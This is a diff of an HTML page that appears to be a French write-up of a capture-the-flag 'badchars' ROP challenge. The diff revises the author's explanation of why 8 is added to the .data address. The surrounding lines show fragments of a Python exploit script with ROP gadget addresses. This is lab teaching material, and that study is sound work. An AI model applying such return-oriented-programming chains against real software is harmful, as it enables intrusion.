@@ -1380,7 +1380,7 @@ You&#39;ll still need to deal with writing a string into memory, similar to the 
 </h1>
 <p>Voici donc notre payload:</p>
 <blockquote>
-<p>Note: j&rsquo;ai dû ajouter 8 à l&rsquo;adresse de <code>.data</code> sinon ça ne fonctionnait pas (l&rsquo;avant dernier caractère du string ne changeait pas)</p>
+<p>Note: j&rsquo;ai dû ajouter 8 à l&rsquo;adresse de <code>.data</code> puisque sinon il y avait un badchar dans l&rsquo;adresse elle même et elle se faisait filtrer</p>
 </blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
@@ -1408,7 +1408,7 @@ You&#39;ll still need to deal with writing a string into memory, similar to the 
 </span></span><span style="display:flex;"><span>pop_r12_r13_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040069c</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour éviter des problèmes de type, on va prendre uniquement la valeur décimale de .data</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour une raison inconnue, j&#39;ai eu besoin d&#39;ajouter 8 à l&#39;adresse du .data, sinon ça ne marchait pas</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># +8</span>
 </span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#ae81ff">6295600</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>mov_ptr_r13_r12 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400634</span>)
